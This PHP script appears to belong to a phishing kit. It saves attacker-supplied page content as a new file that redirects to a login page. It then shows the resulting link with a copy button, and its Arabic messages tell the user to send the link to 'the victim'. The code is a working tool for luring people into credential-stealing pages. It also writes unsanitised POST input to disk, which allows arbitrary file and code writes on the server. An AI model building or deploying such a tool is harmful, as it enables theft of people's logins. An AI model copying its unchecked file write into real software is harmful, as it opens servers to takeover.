<?php
include "copy.css";
include "copy.js";
$name = $_POST['name'];
$co = $_POST['file'];
if(file_exists('..//'.$name)){
    echo "هذا الملف موجد الرجاء تغير اسم الملف" . "<br>" ;
    echo "يمكنك نسخ الرابط او فتح الصفحة وبعد نسخ الرابط السله الى الضحية";
    echo "<br>";
    echo '<blockquote id="myInput">';
    echo $_SERVER['HTTP_HOST'] ."/".$name;
    echo '</blockquote>';
    echo '<button class="k2-copy-button" id="k2button"><svg aria-hidden="true" height="1em" preserveaspectratio="xMidYMid meet" role="img" viewbox="0 0 24 24" width="1em" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><g fill="none"><path d="M13 6.75V2H8.75A2.25 2.25 0 0 0 6.5 4.25v13a2.25 2.25 0 0 0 2.25 2.25h9A2.25 2.25 0 0 0 20 17.25V9h-4.75A2.25 2.25 0 0 1 13 6.75z" fill="currentColor"><path d="M14.5 6.75V2.5l5 5h-4.25a.75.75 0 0 1-.75-.75z" fill="currentColor"><path d="M5.503 4.627A2.251 2.251 0 0 0 4 6.75v10.504a4.75 4.75 0 0 0 4.75 4.75h6.494c.98 0 1.813-.626 2.122-1.5H8.75a3.25 3.25 0 0 1-3.25-3.25l.003-12.627z" fill="currentColor"></path></path></path></g></svg>Copy</button>' ;
}
else{
    file_put_contents("..//".$name,"<?php header('REFRESH:1;url=login.php');
?>"."<br />".$co);
echo "تم حفظ الملف بنجاح" . "<br>";
echo "يمكنك نسخ الرابط او فتح الصفحة وبعد نسخ الرابط السله الى الضحية";
echo "<br>";

echo "<br>";
echo '<blockquote id="myInput">';
echo $_SERVER['HTTP_HOST'] ."/".$name;
echo '</blockquote>';
echo '<button class="k2-copy-button" id="k2button"><svg aria-hidden="true" height="1em" preserveaspectratio="xMidYMid meet" role="img" viewbox="0 0 24 24" width="1em" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><g fill="none"><path d="M13 6.75V2H8.75A2.25 2.25 0 0 0 6.5 4.25v13a2.25 2.25 0 0 0 2.25 2.25h9A2.25 2.25 0 0 0 20 17.25V9h-4.75A2.25 2.25 0 0 1 13 6.75z" fill="currentColor"><path d="M14.5 6.75V2.5l5 5h-4.25a.75.75 0 0 1-.75-.75z" fill="currentColor"><path d="M5.503 4.627A2.251 2.251 0 0 0 4 6.75v10.504a4.75 4.75 0 0 0 4.75 4.75h6.494c.98 0 1.813-.626 2.122-1.5H8.75a3.25 3.25 0 0 1-3.25-3.25l.003-12.627z" fill="currentColor"></path></path></path></g></svg>Copy</button>' ;
}